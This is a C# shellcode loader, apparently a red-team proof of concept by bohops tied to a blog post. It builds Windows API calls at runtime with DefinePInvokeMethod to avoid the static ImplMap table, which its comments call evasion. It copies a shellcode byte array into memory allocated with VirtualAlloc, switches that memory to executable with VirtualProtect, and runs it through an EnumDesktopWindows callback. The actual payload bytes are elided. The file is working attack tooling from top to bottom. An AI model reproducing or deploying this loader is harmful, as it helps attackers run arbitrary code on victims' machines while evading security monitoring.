// Dynamic PInvoke: Leverages DefinePInvokeMethod() for Instrumentation
// Features: ImplMap Table Evasion, RW/RX Memory Allocation/Manipulation, EnumDesktopWindows() callback for shellcode execution
// Reference: https://bohops.com/2022/04/02/unmanaged-code-execution-with-net-dynamic-pinvoke/
// Author: bohops

using System;
using System.Runtime.InteropServices;
using System.Reflection;
using System.Reflection.Emit;

namespace ShellcodeLoader
{
    class Program
    {
      static void Main(string[] args)
      {
            byte[] shellcode = { 0xe8, 0x80, ... };

            IntPtr funcAddr = VirtualAlloc(
                                  IntPtr.Zero,
                                  (uint)shellcode.Length,
                                  0x1000,
                                  0x04);

            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);

            EnumDesktopWindowsDelegate dwDelegate = (EnumDesktopWindowsDelegate)Marshal.GetDelegateForFunctionPointer(funcAddr, typeof(EnumDesktopWindowsDelegate));

            UInt32 threadID = GetCurrentThreadId();
            IntPtr threadDesktop = GetThreadDesktop(threadID);

            UInt32 flOldProtect = 0;
            if (VirtualProtect(funcAddr, (UIntPtr)shellcode.Length, 0x20, ref flOldProtect))
            {
                EnumDesktopWindows(threadDesktop, dwDelegate, IntPtr.Zero);
            }

            return;
        }

        public static object DynamicPInvokeBuilder(Type type, string library, string method, Object[] args, Type[] paramTypes)
        {
            AssemblyName assemblyName = new AssemblyName("zz");
            AssemblyBuilder assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            ModuleBuilder moduleBuilder = assemblyBuilder.DefineDynamicModule("zz");

            MethodBuilder methodBuilder = moduleBuilder.DefinePInvokeMethod(method, library, MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl, CallingConventions.Standard, type, paramTypes, CallingConvention.Winapi, CharSet.Ansi);

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();

            MethodInfo dynamicMethod = moduleBuilder.GetMethod(method);
            object res = dynamicMethod.Invoke(null, args);
            return res;
        }

        public static IntPtr VirtualAlloc(IntPtr lpAddress, UInt32 dwSize, UInt32 flAllocationType, UInt32 flProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UInt32), typeof(UInt32), typeof(UInt32) };
            Object[] args = { lpAddress, dwSize, flAllocationType, flProtect };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "Kernel32.dll", "VirtualAlloc", args, paramTypes);
            return (IntPtr)res;
        }

        public static bool VirtualProtect(IntPtr hProcess, UIntPtr dwSize, UInt32 flNewProtect, ref UInt32 lpflOldProtect)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(UIntPtr), typeof(UInt32), typeof(UInt32).MakeByRefType() };
            Object[] args = { hProcess, dwSize, flNewProtect, lpflOldProtect };
            object res = DynamicPInvokeBuilder(typeof(bool), "Kernel32.dll", "VirtualProtect", args, paramTypes);
            return (bool)res;
        }

        public static IntPtr GetThreadDesktop(UInt32 dwThreadId)
        {
            Type[] paramTypes = { typeof(UInt32) };
            Object[] args = { dwThreadId };
            object res = DynamicPInvokeBuilder(typeof(IntPtr), "user32.dll", "GetThreadDesktop", args, paramTypes);
            return (IntPtr)res;
        }

        public static UInt32 GetCurrentThreadId()
        {
            Type[] paramTypes = { };
            Object[] args = { };
            object res = DynamicPInvokeBuilder(typeof(UInt32), "Kernel32.dll", "GetCurrentThreadId", args, paramTypes);
            return (UInt32)res;
        }

        public static bool EnumDesktopWindows(IntPtr hDesktop, EnumDesktopWindowsDelegate lpfn, IntPtr lParam)
        {
            Type[] paramTypes = { typeof(IntPtr), typeof(EnumDesktopWindowsDelegate), typeof(IntPtr) };
            Object[] args = { hDesktop, lpfn, lParam };
            object res = DynamicPInvokeBuilder(typeof(bool), "user32.dll", "EnumDesktopWindows", args, paramTypes);
            return (bool)res;
        }

        public delegate bool EnumDesktopWindowsDelegate(IntPtr hWnd, int lParam);
    }
}
